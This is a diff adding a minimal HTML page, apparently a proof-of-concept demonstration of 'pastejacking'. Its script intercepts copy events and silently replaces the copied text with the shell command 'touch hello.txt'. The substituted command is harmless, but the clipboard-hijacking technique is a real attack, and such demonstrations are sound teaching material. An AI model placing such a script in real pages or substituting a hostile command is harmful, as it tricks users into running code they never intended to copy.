@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PasteJacking</title>
+</head>
+<body>
+    <h1>Hello World!!!</h1>
+
+    <script>
+        document.addEventListener('copy', function(e) {
+            console.log(e);
+            e.clipboardData.setData('text/plain', 'touch hello.txt')
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
